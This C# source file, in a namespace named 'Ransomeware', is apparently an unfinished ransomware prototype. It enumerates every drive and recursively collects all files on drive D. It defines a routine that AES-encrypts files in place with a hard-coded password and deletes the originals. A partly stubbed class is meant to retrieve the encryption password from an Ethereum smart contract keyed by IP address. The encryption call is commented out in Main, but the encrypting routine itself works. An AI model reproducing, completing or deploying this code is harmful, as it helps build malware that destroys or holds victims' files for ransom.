using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using SharpAESCrypt;
using System.IO;
using Nethereum.Web3;
using Nethereum.Contracts;

namespace Ransomeware
{
    class Program
    {
        static void Main(string[] args){
            // GetAll Drive in PC
            DriveInfo[] drivers = DriveInfo.GetDrives();
            foreach (var item in drivers)
            {
                Console.WriteLine($"Driver: {item.Name}");
            }
            Console.ReadLine();

            //Get add folder in Driver
            string[] files = GetFilesInDrive("D");
            foreach (string file in files)
            {
                Console.WriteLine(file);
            }

            Console.ReadLine();
            // string dir = "/Users/cuongpham/development/C#/Ransomeware/My Files/";
            // List<string> files = new List<string>();
            // DirectoryInfo d = new DirectoryInfo(dir);

            // //Build out list of files
            // foreach (var file in d.GetFiles("*.txt"))
            // {
            //     files.Add(file.ToString());
            // }

            // //Encrypt all files
            // var ransomeware = new Ransomeware();
            // // ransomeware.encryptedFile(files,dir);
            // ransomeware.decrytedFile(files,dir);
        }

        private static string[] GetFilesInDrive(string v)
        {
           try
           {
                string[] files = Directory.GetFiles(v + ":\\", "*", SearchOption.AllDirectories);
                return files;
           }
           catch (System.Exception ex)
           {
                Console.WriteLine($"Error accessing drice {v}: {ex.Message}");
                return new string[0];
           }
        }
    }
    /// <summary>
    /// Giao tiếp với Smart Contract để tạo, lấy mật khẩu mã hoá file
    /// </summary>
    class SmartContract{
        public Web3 web3;
        public Contract contract;
        public string contractAddress = "";
        public string contractAbi = "";
        public string linkRPC = "";

        public SmartContract(string _contractAddress, string _contractAbi,string _linkRPC)
        {
            this.contractAddress = _contractAddress;
            this.contractAbi = _contractAbi;
            this.linkRPC = _linkRPC;
            this.web3 = new Web3(_linkRPC);
            this.contract = web3.Eth.GetContract(this.contractAbi, this.contractAddress);
        }
        /// <summary>
        /// 
        /// </summary>
        /// <returns></returns>
        public async Task craetePasswordEncrypt(string ipAdress){
            var function = this.contract.GetFunction("craetePasswordEncrypt");

        }
        public async Task<string> resultsPasswordDecryted(){
            string password = "";
            var function = this.contract.GetFunction("resultsPasswordDecryted");
            password = await function.CallAsync<string>("");
            return password;
        }
    }
    class Ransomeware{
        public void encryptedFile(List<string> files, string dir = "/Users/cuongpham/development/C#/Ransomeware/My Files/")
        {
            foreach (var file in files)
            {
                string encrypted_file = dir + "encrypted_file.txt";
                SharpAESCrypt.SharpAESCrypt.Encrypt("password", file, encrypted_file);
                File.Delete(file);
                File.Move(encrypted_file, file);
            }
        }
        public void decrytedFile(List<string> files, string dir = "/Users/cuongpham/development/C#/Ransomeware/My Files/")
        {
            foreach (var file in files)
            {
                string decryted_file = dir + "crypted_file.txt";
                SharpAESCrypt.SharpAESCrypt.Decrypt("password", file, decryted_file);
                File.Delete(file);
                File.Move(decryted_file,file);                
            }
        }
    }
}